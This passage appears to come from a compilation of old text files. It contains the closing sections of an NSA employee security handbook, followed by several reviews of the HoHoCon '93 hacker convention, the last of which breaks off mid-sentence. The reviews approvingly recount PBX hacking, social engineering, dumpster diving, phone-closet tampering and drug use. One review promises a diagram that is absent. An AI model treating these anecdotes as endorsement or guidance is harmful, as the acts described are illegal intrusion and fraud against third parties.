these areas, all Agency personnel must ensure that no classified information is
discussed in an Administrative Area.

Classified information being transported within Agency facilities must be
placed within envelopes, folders, briefcases, etc. to ensure that its contents
or classification markings are not disclosed to unauthorized persons, or that
materials are not inadvertently dropped enroute.

The normal operational work spaces within an NSA facility are designated Secure
Areas.  These areas are approved for classified discussions and for the storage
of classified material.  Escorts must be provided if it is necessary for
uncleared personnel (repairmen, etc.) to enter Secure Areas, an all personnel
within the areas must be made aware of the presence of uncleared individuals.
All unknown, unescorted visitors to Secure Areas should be immediately
challenged by the personnel within the area, regardless of the visitors&#039;
clearance level (as indicated by their badge color).

The corridor doors of these areas must be locked with a deadbolt and all
classified information in the area must be properly secured after normal
working hours or whenever the area is unoccupied.  When storing classified
material, the most sensitive material must be stored in the most secure
containers.  Deadbolt keys for doors to these areas must be returned to the key
desk at the end of the workday.

For further information regarding Secure Areas, consult the Physical Security
Division (M51) or your staff Security Officer.

Items Treated As Classified

For purposes of transportation, storage and destruction, there are certain
types of items which must be treated as classified even though they may not
contain classified information.  Such items include carbon paper, vu-graphs,
punched machine processing cards, punched paper tape, magnetic tape, computer
floppy disks, film, and used typewriter ribbons.  This special treatment is
necessary since a visual examination does not readily reveal whether the items
contain classified information.

Prohibited Items

Because of the potential security or safety hazards, certain items are
prohibited under normal circumstances from being brought into or removed from
any NSA installation.  These items have been groped into two general classes.
Class I prohibited items are those which constitute a threat to the safety and
security of NSA/CSS personnel and facilities.  Items in this category include:

        a.  Firearms and ammunition
        b.  Explosives, incendiary substances, radioactive materials, highly
            volatile materials, or other hazardous materials
        c.  Contraband or other illegal substances
        d.  Personally owned photographic or electronic equipment including
            microcomputers, reproduction or recording devices, televisions or
            radios.

Prescribed electronic medical equipment is normally not prohibited, but
requires coordination with the Physical Security Division (M51) prior to being
brought into any NSA building.

Class II prohibited items are those owned by the government or contractors
which constitute a threat to physical, technical, or TEMPEST security.
Approval by designated organizational officials is required before these items
can be brought into or removed from NSA facilities.  Examples are:

        a.  Transmitting and receiving equipment
        b.  Recording equipment and media
        c.  Telephone equipment and attachments
        d.  Computing devices and terminals
        e.  Photographic equipment and film

A more detailed listing of examples of Prohibited Items may be obtained from
your Staff Security Officer or the Physical Security Division (M51).

Additionally, you may realize that other seemingly innocuous items are also
restricted and should not be brought into any NSA facility.  Some of these
items pose a technical threat; others must be treated as restricted since a
visual inspection does not readily reveal whether they are classified.  These
items include:

        a.  Negatives from processed film; slides; vu-graphs
        b.  Magnetic media such as floppy disks, cassette tapes, and VCR
            videotapes
        c.  Remote control devices for telephone answering machines
        d.  Pagers

Exit Inspection

As you depart NSA facilities, you will note another physical security
safeguard--the inspection of the materials you are carrying.  This inspection
of your materials, conducted by Security Protective Officers, is designed to
preclude the inadvertent removal of classified material.  It is limited to any
articles that you are carrying out of the facility and may include letters,
briefcases, newspapers, notebooks, magazines, gym bags, and other such items.
Although this practice may involve some inconvenience, it is conducted in your
best interest, as well as being a sound security practice.  The inconvenience
can be considerably reduced if you keep to a minimum the number of personal
articles that you remove from the Agency.

Removal Of Material From NSA Spaces

The Agency maintains strict controls regarding the removal of material from its
installations, particularly in the case of classified material.

Only under a very limited and official circumstances classified material be
removed from Agency spaces.  When deemed necessary, specific authorization is
required to permit an individual to hand carry classified material out of an NSA
building to another Secure Area.  Depending on the material and circumstances
involved, there are several ways to accomplish this.

A Courier Badge authorizes the wearer, for official purposes, to transport
classified material, magnetic media, or Class II prohibited items between NSA
facilities.  These badges, which are strictly controlled, are made available by
the Physical Security Division (M51) only to those offices which have specific
requirements justifying their use.

An Annual Security Pass may be issued to individuals whose official duties
require that they transport printed classified materials, information storage
media, or Class II prohibited items to secure locations within the local area.
Materials carried by an individual who displays this pass are subject to spot
inspection by Security Protective Officers or other personnel from the Office
of Security.  It is not permissible to use an Annual Security Pass for personal
convenience to circumvent inspection of your personal property by perimeter
Security Protective Officers.

If you do not have access to a Courier Badge and you have not been issued an
Annual Security Pass, you may obtain a One-Time Security Pass to remove
classified materials/magnetic media or admit or remove prohibited items from an
NSA installation.  These passes may be obtained from designated personnel
in your work element who have been given authority to issue them.  The issuing
official must also contact the Security Operations Center (SOC) to obtain
approval for the admission or removal of a Class I prohibited item.

When there is an official need to remove government property which is not
magnetic media, or a prohibited or classified item, a One-Time Property Pass is
used.  This type of pass (which is not a Security Pass) may be obtained from
your element custodial property officer.  A Property Pass is also to be used
when an individual is removing personal property which might be reasonably be
mistaken for unclassified Government property.  This pass is surrendered to the
Security Protective Officer at the post where the material is being removed.
Use of this pass does not preclude inspection of the item at the perimeter
control point by the Security Protective Officer or Security professionals to
ensure that the pass is being used correctly.

External Protection Of Classified Information

On those occasions when an individual must personally transport classified
material between locations outside of NSA facilities, the individual who is
acting as the courier must ensure that the material receives adequate
protection. Protective measures must include double wrapping and packaging of
classified information, keeping the material under constant control, ensuring
the presence of a second appropriately cleared person when necessary, and
delivering the material to authorized persons only.  If you are designated as a
courier outside the local area, contact the Security Awareness Division (M56)
for your courier briefing.

Even more basic than these procedures is the individual security responsibility
to confine classified conversations to secure areas.  Your home, car pool, and
public places are not authorized areas to conduct classified discussions--even
if everyone involved in he discussion possesses a proper clearance and
&quot;need-to-know.&quot;  The possibility that a conversation could be overheard by
unauthorized persons dictates the need to guard against classified discussions
in non-secure areas.

Classified information acquired during the course of your career or assignment
to NSA may not be mentioned directly, indirectly, or by suggestion in personal
diaries, records, or memoirs.

Reporting Loss Or Disclosure Of Classified Information

The extraordinary sensitivity of the NSA mission requires the prompt reporting
of any known, suspected, or possible unauthorized disclosure of classified
information, or the discovery that classified information may be lost, or is not
being afforded proper protection.  Any information coming to your attention
concerning the loss or unauthorized disclosure of classified information should
be reported immediately to your supervisor, your Staff Security Officer, or the
Security Operations Center (SOC).

Use Of Secure And Non-Secure Telephones

Two separate telephone systems have been installed in NSA facilities for use in
the conduct of official Agency business:  the secure telephone system (gray
telephone) and the outside, non-secure telephone system (black telephone).  All
NSA personnel must ensure that use of either telephone system does not
jeopardize the security of classified information.

The secure telephone system is authorized for discussion of classified
information.  Personnel receiving calls on the secure telephone may assume that
the caller is authorized to use the system.  However, you must ensure that the
caller has a &quot;need-to-know&quot; the information you will be discussing.

The outside telephone system is only authorized for unclassified official
Agency business calls.  The discussion of classified information is not
permitted on this system.  Do not attempt to use &quot;double-talk&quot; in order to
discuss classified information over the non-secure telephone system.

In order to guard against the inadvertent transmission of classified
information over a non-secure telephone, and individual using the black
telephone in an area where classified activities are being conducted must
caution other personnel in the area that the non-secure telephone is in use.
Likewise, you should avoid using the non-secure telephone in the vicinity of a
secure telephone which is also in use.

HELPFUL INFORMATION

Security Resources

In the fulfillment of your security responsibilities, you should be aware that
there are many resources available to assist you.  If you have any questions or
concerns regarding security at NSA or your individual security
responsibilities, your supervisor should be consulted.  Additionally, Staff
Security Officers are appointed to the designated Agency elements to assist
these organizations in carrying out their security responsibilities.  There is
a Staff Security Officer assigned to each organization; their phone numbers are
listed at the back of this handbook.  Staff Security Officers also provide
guidance to and monitor the activities of Security Coordinators and Advisors
(individuals who, in addition to their operational duties within their
respective elements, assist element supervisors or managers in discharging
security responsibilities).

Within the Office of Security, the Physical Security Division (M51) will offer
you assistance in matters such as access control, security passes, clearance
verification, combination locks, keys, identification badges, technical
security, and the Security Protective Force.  The Security Awareness Division
(M56) provides security guidance and briefings regarding unofficial foreign
travel, couriers, special access, TDY/PCS, and amateur radio activities.  The
Industrial and Field Security Division (M52) is available to provide security
guidance concerning NSA contractor and field site matters.

The Security Operations Center (SOC) is operated by two Security Duty Officers
(SDOs), 24 hours a day, 7 days a week.  The SDO, representing the Office of
Security, provides a complete range of security services to include direct
communications with fire and rescue personnel for all Agency area facilities.
The SDO is available to handle any physical or personnel problems that may
arise, and if necessary, can direct your to the appropriate security office
that can assist you.  After normal business hours, weekends, and holidays, the
SOC is the focal point for all security matters for all Agency personnel and
facilities (to include Agency field sites and contractors).  The SOC is located
in Room 2A0120, OPS 2A building and the phone numbers are 688-6911(b),
963-3371(s).

However, keep in mind that you may contact any individual or any division
within the Office of Security directly.  Do not hesitate to report any
information which may affect the security of the Agency&#039;s mission, information,
facilities or personnel.

Security-Related Services

In addition to Office of Security resources, there are a number of
professional, security-related services available for assistance in answering
your questions or providing the services which you require.

The Installations and Logistics Organization (L) maintains the system for the
collection and destruction of classified waste, and is also responsible for the
movement and scheduling of material via NSA couriers and the Defense Courier
Service (DCS).  Additionally, L monitors the proper addressing, marking, and
packaging of classified material being transmitted outside of NSA; maintains
records pertaining to receipt and transmission of controlled mail; and issues
property passes for the removal of unclassified property.

The NSA Office of Medical Services (M7) has a staff of physicians, clinical
psychologists and an alcoholism counselor.  All are well trained to help
individuals help themselves in dealing with their problems.  Counseling
services, with referrals to private mental health professionals when
appropriate, are all available to NSA personnel.  Appointments can be obtained
by contacting M7 directly.  When an individual refers himself/herself, the
information discussed in the counseling sessions is regarded as privileged
medical information and is retained exclusively in M7 unless it pertains to the
national security.

Counselling interviews are conducted by the Office of Civilian Personnel (M3)
with any civilian employee regarding both on and off-the-job problems.  M3 is
also available to assist all personnel with the personal problems seriously
affecting themselves or members of their families.  In cases of serious
physical or emotional illness, injury, hospitalization, or other personal
emergencies, M3 informs concerned Agency elements and maintains liaison with
family members in order to provide possible assistance.  Similar counselling
services are available to military assignees through Military Personnel (M2).

A FINAL NOTE

The information you have just read is designed to serve as a guide to assist
you in the conduct of your security responsibilities.  However, it by no means
describes the extent of your obligation to protect information vital to the
defense of our nation.  Your knowledge of specific security regulations is part
of a continuing process of education and experience.  This handbook is designed
to provide he foundation of this knowledge and serve as a guide to the
development of an attitude of security awareness.

In the final analysis, security is an individual responsibility.  As a
participant in the activities of the National Security Agency organization, you
are urged to be always mindful of the importance of the work being accomplished
by NSA and of the unique sensitivity of the Agency&#039;s operations.

  HoHoCon &#039;93 review from the European point of view
&lt;=====================================================&gt;

This is Onkel Dittmeyer telling you his experiences at
the HoHoCon, which no-one really gives a @#*! about.
It might be fun reading anyway.

&quot; Maybe I am just a lumpy coder, but at least my
  dad is not selling WOMEN&#039;S SHOES. &quot;

                                    - Guess Who

I arrived at the con one day too early, before anyone else
had showed up, and started striving through the
neighborhood. Well, this looked like fun. The Hilton and the
Super-8 were, along with a mall and a South Western Bell
building with light-at-night, wide open, overflowing
dumpsters situated between highways, a couple miles outside
of town. Cool. Used to Europe, where there is more public
transportation than cars on the street, I was kinda stuck in
there, so I spent my time chatting with the front desk clerk
of the motel (&quot;Monty? Ahh, ya mean Monty from the hotel
security? Well, don&#039;t spread the word, he has a penis
problem..&quot;). Everybody was able to confirm this a day
later during on a police raid, but let&#039;s save that for
later. So stuck between a WAL-MART (&quot;SHOTGUNS! ON SALE! JUST
$99&quot;), a movie theater and a cheap mall I spent this day
sipping complimentary tea at the front desk and watching
Wayne&#039;s World 2. (&quot;A Unix Book. Cool.&quot;)

On the next day, all kinds of people started to flow in, and
I spent my time following around various people since I came
to the con alone, not seeing one familiar face around. I
bumped into Minor Threat and his trusty friend Mucho plus
a bunch of other guys trying to fix something with ToneLoc.
Walking around a little more, I ran into some dudes that
were busy hacking into the hotel&#039;s PBX using its 1200-bps
line.. Walking over to the Hilton, I found a tone in a wall
jack and called home. Still talking, hunger overcame me and
I decided to go to the mall and grab munchies. Walking past
the Hilton&#039;s pool, a kid was trying to fish his scanner out
of the water. Remember: A PRO-43 does NOT stay afloat! Later
that night, the whole place was pretty crowded already. It
was unreal. The lobby was crowded by at least two dozen
scanner-wielding kids, trying to find the frequency for the
hotel security. The guards must have been felt pretty
strange - each time they talked, something like five people
with frequency counters walked past them. Finally, the word
spread (466.025/825) and each time some guard started
talking, it was echoing back over everyone&#039;s scanner in a
two-mile range around the party place. I soon left the 3L3eT pIt
and hung out with AKA to play some stupid games (&quot;Oh, there
is a calling card on the floor.&quot; &quot;Where??&quot; &quot;You can&#039;t see it,
its eleet!&quot;) when we saw red and blue lights in front of the
Super-8 Motel. Three cop-cars had arrived, and they busted
an about 14-years old kid for scanning local numbers from
his motel room. While everybody stood around in front of the
room where they hold (or ABUSED) the kid, people were
thinking if this would be legal, arresting and squeezing
this kid with no lawyer and no parents around, they sped past
us with their victim, and someone told the kid that it was his
constitutional right to remain silent until he would get a
lawyer or at least a parent. And guess: The cops pulled the
guy out and told him that he should not stand around and
advise people about their constitutional rights. Quote:
&quot; This is the manager, this is a police officer, I am the
security guard. LEAVE! &quot; - &quot;And I will NOT leave.&quot; Good
thing that someone was videotaping the whole thing. So much
action, and the con hadn&#039;t even started. Tired of so eViL
K-r0cKinG rAcIsM I stumbled to my room and fell asleep on
some standup comedy on TV. Tomorrow was the con!

The next morning around 9, I found the food court in the
mall crowded. It seemed like everybody on the con was going
to eat the last time for his life, or at least the last
time before the 6-hour Con-A-Thon started. Walking around in
the empty conference room, some hotel employee asked me
&quot;HoHoCon? Is this like a Santa Claus meeting or something?&quot;
Maybe it was just cause I wore a santa-hat. When Drunkfux
finally started the meeting one hour late I found myself
squashed in between some system administrator and another
guy from some three-letter-agency that typed everything that
was said into his laptop at something like 2.000.000
characters a second. Scared shitless, I was listening to the
events, still a little drowsy from very little sleep the
last night - I only remember Cap&#039;n Crunch talking about
boxing in Russia (something that interested me, at least),
and the LOD members talking about some data preservation
project - if you are interested what in detail was talked
about, I&#039;m sure Drunkfux will sell you the videotape for a
couple hundred $. In a break, he was selling merchandise,
and I think he didn&#039;t look more happy during the whole con
than in the moment everybody was waving with twenty-dollar
bills.. Phat pockets was also what the LOD guys were looking
for.. (just in case you don&#039;t know: They are collecting old
message boards and sell the printout for something like $35).

After this sellout session, I found a sign on the wall:
&quot;hoho.con.com ---&gt;&quot;, and, in room 260 someone piled up an
enormous mass of equipment, including something like 4 UNIX
machines, a SLIP connection, 20&quot; screens, PET&#039;s.. Plus, the
room was stacked with 30-40 people, and I mean STACKED. Most
people were wasting their time entering commands like
&quot;mget /warez/eleet/hot/0-day/*.*&quot; Sick of that, I grabbed a
bunch of people and we went trashing at SW-Bell around the
block, and whoops! we found a diagram like this:

December, 1993, it was.

                TEN THINGS I LEARNED AT HOHOCON &#039;93

 1. Social-Engineering the front-desk clerk PAYS!
 2. If you drink 20 cups of complimentary tea, they WILL hassle you.
 3. If the guard hears his voice over your scanner, he WILL hassle you.
 4. If you sign on as CLIFF STOLL and pay cash, they WONT hassle you.
 5. Don&#039;t scan from a hotel room. But feel free to hack the PBX.
 6. Pizza Hut accepts all major credit cards.
 7. Austin, Texas, is the center of the universe.
 8. Some people really want room service in a Super-8 Motel.
 9. A radio shack is not lighter than water nor water-proof.
10. Barney is a purple penis.

Conference Behavior - a Study of the Lame and the Damned

by Holistic Hacker/R2

[This little file was inspired by a talk Phantom Phreaker and I had at
HoHoCon last year, after some of the stupid shit that went on at it and
SummerCon.  The rough draft was written on my laptop on the flight back
from Austin.]

It seems some little kids are having problems figuring out how to act
at the various hacker cons around the country.  Hacking has nothing to do
with how many smoke bombs you can drop in the hotel or how many fire
extinguishers you steal.  If you lamers think that being away from mommy
for the first time in your life means that you can trash a hotel, then do
it.  By all means make it a local one first, so Mom and Dad can bail your
sorry ass out of jail.

I get really tired of going to a con and some little punk wants to play
eleet anarchist and then the cops show.  Cons are a chance to learn and/or
share info, see people, and have a good time.  Shit like what has happened
this last year just isn&#039;t needed.  All that comes out of stupid actions is
a bad rap on the &quot;underground.&quot;  Some friends and I were in the hotel bar
Saturday night and the bartender was telling us how the hotel people were
really getting tired of the lame shit.

I was in one room Saturday night, swapping files and talking when the
smoke alarm went off at 3 AM or so.  I bet whoever did it got a real kick
seeing all of the people up, and he probably creamed his jeans when the
fire truck showed up.  Emergency personnel don&#039;t need to waste their time
on wannabe anarchist weenies, it isn&#039;t their job.

Another brilliant soul decided to set off one of the fire extinguishers
in the Super 8.  I saw other jerks trying to wake up the people on the top
two floors of the Hilton at 2 in the morning.  I saw another guy carrying two
extinguishers off, and he didn&#039;t look like hotel staff.  Another genius
tried cutting a hole in the vending machine with a glass cutter.  Just
because it isn&#039;t your property means you can trash it.  The fucked-up
elevator control panels, the damaged exit signs, etc. are costs the hotel
passes on to the customers and to us.  Even worse, when the word gets
out, the hotels don&#039;t want the cons back.  Why would they want to rent us
rooms, if they are just gonna get trashed?  If this is how you want cons
to be, then hold your own.

     All typos are intentional.  The following summary of HohoCon 93
     is based solely upon my perceptions and are subject to the laws of
     physics.  Take these comments as you see them.

     By Frosty

First off, there was a $5 charge at the door.  This also entitled you to
partake in the raffle offered of lame-to-cool objects.  $100 would rig the
raffle in your favor.  One person walked away with a full //e system, and
another with a 486 system.

The Conference ---
------------------

Bruce Sterling - A humorous talk that thrashed virii.  Informed us of the #1
                 anti-virii person in Russia, Dimitri.  Generously gave away
                 several copies of &quot;The Hacker Crackdown&quot; on disk.
                 Famous quote, &quot;Information wants to be free.&quot;

Ray Kaplan - A humorous security consultant.  Wants to establish a site for
             security holes to be available.  Had a brief Q&amp;A session.  Wants
             interaction between the security consultants and hackers.  Also
             stressed protecting information and privacy.

Douglas Barnes - Representatives from CypherPunks.  Works in cryptography.
Jim              Famous quote, &quot;I want to talk to my lawyer.&quot;  Another
                 quote, &quot;Hackers are requested to call between 9 and 5.&quot;
                 There are several Fidonet sites not allowing encrypted
                 messages to go through.  The liability decreases with a
                 site allowing encrypted messages.  ViaCrypt PGP is the
                 legal version of PGP.  Another quote, &quot;A triple DES file
                 is as good as unbreakable.&quot;  Pushed the book &quot;Applied
                 Cryptography.&quot;  Working on a digital Credit Union.
                 System Administrators are not responsible for passing
                 codes.  Quote, &quot;The net perceives censorship and routes
                 around it.&quot;

Grayareas - Made a magazine plug.  Looking for information for the &#039;zine.

Damien Thorn - Works on the &#039;zine &quot;Nuts and Bolts.&quot;  Talked about cellular
               tracking and hacking.  Informed that a cell hacking program
               can be obtained from mkl@nw.com.

Captain Crunch - Talked on the San Francisco raves and how they utilized
aka John Draper  networking and encryption to get their rave information out.
                 Gave history and information on hacking Soviet phones and
                 the KGB lines.

Simmion - Attendee from Moscow.  Stated there was no evidence of virii being
          highly prolific in Russia.  Almost all software is free in Russia.
          Most conferences in Russia are done by BBS&#039;s.  Russians can not
          afford the high software prices legally.

LOD/Comm - Project information on their Digital Archive project.
           Also, presented a cash donation to the SotMESC to help fund
           a scholarship campaign for those involved in the hacking realm.

Erik Bloodaxe - Conversed about wireless modems and Email networks.

The Omega
White Knight - gave out copies of a government document on UFO coverups.

Count Zero - Members of the cDc/RDT.  Handed out fliers and gave a packet
Kingpin      radio demonstration.  Informed they would be coming out with
             the &#039;Jolly-Roger Dialer&#039; for $80 approx. that would be better
             than the &#039;Demon-Dialer&#039; offered by Hack-Tic.

Brian Oblivion - Conversed about legalities and the Clipper Chip.
                 Informed us that the EFF is not promoting help on court
                 cases ( they&#039;re too big ).  Quoted, &quot;The Internet is the
                 collective consciousness of the community.&quot;  Quoted
                 Compuserve that, &quot;The Internet is sewage.&quot;

HoHoCon &#039;93 - Out With A Bang                                January, 1994
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
by Winn Schwartau (Page 8) (Security Insider Report)

The hackers did it again.  A monster party, several hundred strong, where
hacking was the agenda.  HoHoCon is the annual hacker&#039;s convention in Texas,
where all hell breaks loose.  December 17-19 in Austin was the host of this
last one.

According to the hackers, it was a great party; the ethernet lines were run
between rooms; the net was connected, and everyone consumed mass quantities
of their favorite legal substance or controlled substance.  One hacker was
busted, apparently, for breaking into the hotel&#039;s PBX system and dialing the
Planet Krypton (or some such place) and the cops sat outside the front door
just in case.  In case of what?  According to the hotel, in case of crazy
kids getting too crazy.

This last HoHoCon was the biggest yet; estimates from 250-500 people attending
to learn about hacking; keep tabs on the hackers; or hack themselves into
position of respect amongst their peers.  One attendee took roll after roll
of photos of hackers; some hackers got paranoid, others laughed at him hiding
behind pillars and jumping out to snap a pix.  Whatever.

On the other hand, some security professionals who attended were absolutely
aghast at what they saw; wild kids, with no reins, breaking into computers
over the net is not fun nor legal.  The drug and alcohol consumption was
too extreme, and the messages and conference sessions somewhat disorganized.
But, nonetheless, not one person I spoke to said they wouldn&#039;t attend again
next year.  So there must be something to it.  Even legendary phreaks like
John Draper aka Captain Crunch were there, despite his tenuous hold on
reality and emanating odor.

This was the minority, though, and most security pros said they picked up a
few tricks here and there.  HoHoCon next year, the organizers fear, will
turn legit if too many &#039;suits&#039; come so they have to promote the event better.
Next year&#039;s HoHoCon won&#039;t be held until January of 1995, making attendance
easier for those who have Holiday conflicts.

We&#039;ll keep you informed.

------------------------------------------------------------------------------

HoHo Con &#039;93
by Erik Bloodaxe

It was the eve of HoHoCon 93 and I found myself caught in a serious
dilemma.  I had promised to provide this year&#039;s &quot;entertainment&quot; yet
I knew I was going to back out of it.  I had received about a million
emails and chat messages bugging me about the &quot;bondage show&quot; that was
supposed to transpire that Saturday night and had tried my hardest to
give them little or no commentary, knowing full well that I was going to
flake out at the last moment.

So here I was, driving towards the Austin Airport Hilton, trying to come
up with excuses about why there would be no show to some 300 hormonal
sociopaths.  Every scenario seemed bleak:  &quot;Phrack Editor Vivisected!&quot;
&quot;Hacker Revolt Leaves Three Dead, 15 Wounded.&quot;  I tried to blow it off,
consoling myself that no one would really give a shit, and that it was
only my own ego that demanded that I fulfill the promise of sleeze.

Upon arrival at the Hilton, I was amused to find some 30 or more
miscreants milling about the lobby, amusing themselves with house phones
and sordid tales of last week&#039;s hack.  As usual, there was not a
payphone to be had, a direct result of the numerous Radio Shack dialers
on hand (model 43-141).

I mingled somewhat distantly, looking for Chasin, Tcon, Lex, Drunkfux or
anyone else I needed to talk to.  Of course they weren&#039;t there.  I was
beginning to wonder how in the hell I could pass the time when I was
paged by Lex.

Lex Luthor was staying a safe distance from the main fracas.  In typical
Luthorian paranoia, he was determined to not have his name on anything,
such as car rental or hotel room, so by staying just far enough away he
hoped to not have his name on any arrest reports either.  Lex, Professor
Falken, Al Capone, Mark Tabas, The Mentor and I were all supposed to
have dinner that evening.  After getting Lex&#039;s room information, I took
off to get Mentor.

Getting everyone together was somewhat of a clusterfuck.  Tabas was
located at the bottom of a 151 bottle, but surfaced in time to grab
dinner.

During dinner at Baby Acapulco&#039;s, as the award-winning waitstaff lost
most of our orders, Mentor reminisced about some of my more unbalanced
teenage moments such as:  the time I cut the break cables on a Mercedes
because its owner had made the moves on my evening&#039;s female target, the
knife and gun wielding passout on the railroad tracks, etc.  He ended
with, &quot;You sure have changed.  I&#039;m surprised you aren&#039;t dead.&quot;

I suddenly felt old.  It would not be the last time I felt that way that
weekend.

After dinner I decided to be a jerk and lash out at Tabas for insulting
my overinflated ego on the net.  It accomplished nothing, except to further
distance ourselves but this evil voice in my head deemed it necessary.
We agreed to disagree and to try to put aside our numerous past
problems for the interim, although I doubt either of us believed
in the resolution.

Once back at the Hilton, things were beginning to heat up.  Some hundred
or more conferees were loitering back and forth from the Hilton to the
Super 8 next door.  I finally managed to hook up with Chasin, Tcon, Koresh
and Louis Cypher in their room at the Super 8.  Lcypher was enjoying what
would probably be his last taste of freedom, since he was due to ship out
to federal boot camp the next month.

Sometime thereafter, a score of people began running upstairs with
computer equipment, laughing to themselves.  As would be typical, a short
time later several police cruisers showed up.  The kids had broken into
a phone closet and ran extra lines to their room to either:   a) run a bbs,
b) wardial the city or hotel, or c) prove once and for all they were the
dumbest people in attendance.  A member of the Austin EFF chapter ran
about screaming about the rights of the accused.  The police told him
that if he didn&#039;t shut up he would be going downtown as well.  The
silence came instantly.

The appearance of police so soon on the first evening made several
people quite nervous, especially those guests with rather large pupils,
whose numbers were growing in abundance.  They sat in their rooms with
the lights dimmed (or off) peering out the curtains wondering if the cops
would be knocking on their doors next.

Word reached us that KevinTX had shown up.  In typical flair, Kev had
blown in straight from Las Vegas where he had just won some $20,000
playing Blackjack, and was in a very festive mood.  Once we reached his
floor, we were greeted with the sounds of a dozen tropical birds in
terrible agony.  Obviously &quot;the tank&quot; had been filled, and was being
rapidly drained.

Inside the room black plastic bags lined the floor giving the
appearance of a recent trashing run, but in reality were the
victims of an unforgiving blast of n2o.  Some Andrew Blake film played
on the VCR Kevin and his crew had brought, and a new camcorder was being
erected to capture the planned debauchery on tape.

We asked Kevin how on earth they managed to wheel in a 20 lb tank of
nitrous through the lobby and up to the room without being questioned.
Kevin said they put it under a jacket and just walked right through.  I
wondered how long it would be before everyone else began wheeling in
kegs.

I begged everyone not to put the bags over their heads, as resuscitating
any potential asphyxiation victim was not in my agenda.  (Quick flashback
to a blue-faced man spasming from oxygen depravation, &quot;No really officer,
I don&#039;t know why he put that bag on his head and went to sleep.&quot;)
Besides, it would be too far to drag a dead body down to the dumpster
from the hotel room without attracting suspicion.

The tank was drained and the crowd dwindled.

Reflecting upon the altered states of those wandering almost zombie-like
around the hotels, I decided that if anyone were to be raiding the con
it should be the DEA rather than the FBI.

I arrived at the con the next morning lugging a box full of my t-shirts,
ready to make the rent.  In the conference room Bruce Sterling was in the
middle of an incredible rant about the evils of Virii.  I don&#039;t know what
the hell he was talking about.  I&#039;m not quite sure if anyone did, but
I got the impression that he got zapped.  A note to the kiddies:  don&#039;t
copy that floppy!

At the door, dFx was busily commandeering the five dollar &quot;voluntary
contribution.&quot;  I asked him how the take was and he whipped out a stack
of money that would choke an elephant.  I asked him for my share
for being his marketing and advertising rep.  The money and dFx disappeared.

Damien Thorn of Nuts &amp; Volts, whose column is the ONLY reason I subscribe,
took the stand and talked about the magazine and his column.  I
jumped up and asked him about his involvement with Phoenix Rising
Communications, and suggested they not use the name &quot;The Phoenix
Project&quot; as their BBS name.  Damien seemed somewhat apologetic when
he said that he didn&#039;t realize that it had already been used in the past.
(Obviously Sterling&#039;s book didn&#039;t get read by everyone.)

I took off to find out where the casualties from last night were hiding.
After a lengthy and fruitless search for Chasin, Tcon or KevinTX, I stumbled
back into the con area just in time to find out that LOD Communications would
be hitting the podium next.

As we all wandered up front, (we being me, Lex, Tabas, Phantom Phreaker,
Professor Falken and Al Capone), an explosion of camera flashes shook the
conference room.  It was the most ridiculous thing I have ever been a
witness to.  I felt pretty sorry for Lex, who had managed to avoid
being photographed as &quot;Lex Luthor&quot; for his entire life, now being the
target of every butthead with a Nikon in the greater Austin area.

After we rambled about the BBS archive project, I got the chance
to give one of the worst presentations of my life.  I will credit
some of this to the lack of display technology (mainly overhead projector
and VGA adaptor) but the main fault was my own.  I spoke for a bit about
wireless wide area networking via commercial packet radio and about
services such as RadioMail.

Afterwards, Chasin and I introduced White Knight and The Omega who,
in typical cDc fashion, relayed the further adventures of &quot;America&#039;s
Favorite Hacker:  Quentin.&quot;  At the end of their speech, they offered
about a dozen copies of Quentin&#039;s latest exposure of a government cover-up.

The madcap dash of reporters, hackers and various other would-be
co-conspirators to grab the sacred printout was like the closing scene
of &quot;It&#039;s a Mad Mad World.&quot;  The stage rush was not terribly unlike
my first Metallica concert:  people diving over chairs, crawling over
heads, screaming, arms flailing.  The only difference were the
reporters yelling &quot;Press!  Press!  I must have a copy!&quot;

The conference wrapped up with attorney Steve Ryan talking about the
sorry state of computer law.

Bernie Milligan of Communications &amp; Toll Fraud Specialists from Houston
finally ran out of film.  (Bernie, if you recall, was at HoHo &#039;92
sitting at the back of the room with the Super Ear.  I wonder how much
he gets for the photos.  Maybe he just tacks them up on his wall
and has little fantasy conversations with them as he spanks his monkey.
I don&#039;t know.)

After the speaking was concluded, Weevil wandered over and asked me when
the bondage show would be going on.  I told him that it would not
be happening.  Weevil, still very elated over his rave reviews in
&quot;Dazed and Confused,&quot; looked at me and in a stereotypical Hollywood-esque
display of confidence said, &quot;Don&#039;t worry about it dude.  I&#039;ll take care of it.&quot;

A 17 year old actor and would-be pimp.  Yeah, right.

I got shanghaied by John Littman who was working on his book about Kevin
Poulsen, Agent Steal and friends.  We talked for a bit, and I came to
the following conclusions:

5 REASONS WHY I AM LIKE AGENT STEAL

1.  We both shared a knack for dating strippers.
2.  We are both long haired, skinny, aging hackers.
3.  We both know the value of a carefully placed camcorder.
4.  We both have been the subject of investigations by the government.
5.  We both have assisted the government.

5 REASONS WHY I AM NOT LIKE AGENT STEAL

1.  I have both my original legs.
2.  I only use Saran Wrap for leftovers.
3.  I would never dress like any member of Poison.
4.  I stopped breaking into buildings when I was 14.
5.  I would never turn in my friends to save my own ass.

That evening as everyone was getting antsy, Frosty popped up with
his &quot;Techno-Porn.&quot;  Something like 24 hours of non-stop pornography
compressed into 6 hours.  You&#039;d have to see it to understand.

Everyone seemed to migrate towards 508, most likely a direct result
of the internal sex &amp; drug divining rods built into the subconscious of
every attendee.  Sometime around 9 or 10 in the evening, Weevil
showed up parading five very attractive, scantily clad young women.
The strippers made their way through the lobby of the Hilton evoking
a Pied Piper effect, dragging hundreds of drooling hackers in their
wake.

They managed to get into the hotel room unscathed.  Outside the room
the crowds gathered, anxious to get a peek at the girlies.

The girls, meanwhile, got somewhat agitated, looking around at their
predicament.  They had given up their Saturday night shift at Sugar&#039;s
Cabaret (an Austin upscale nudie bar) for the prospect of making some
easy cash at HoHoCon.  Apparently Weevil exaggerated a bit about the
quality of the attendees in his fervor to coax them back to the hotel.

I, being a take charge kind of guy, asked the girls what they needed,
took some orders, and announced to the crowd that anyone who did not have
at least forty dollars needed to get the fuck out.  Once word of the
necessity of money spread among the riot-like crowds swarming the 5th floor,
they became like Donn Parker&#039;s hair and thinned quickly and ultimately
disappeared entirely.

Zar took over the job of guarding the door and making sure that no one got in
without showing that they had cash for the girls, and KevinTX rounded up cash
from within the room and manned the camcorder and radio.  After a few beers,
everyone loosened up and the show began.

Soon, there were topless women everywhere.  There were &quot;table-dances&quot;
happening on the toilet, there were women on the beds, and grinding away
on the floor in front of a mirror.

It was the kind of thing that I&#039;m sure Dr. Mitch Kabay would be shocked
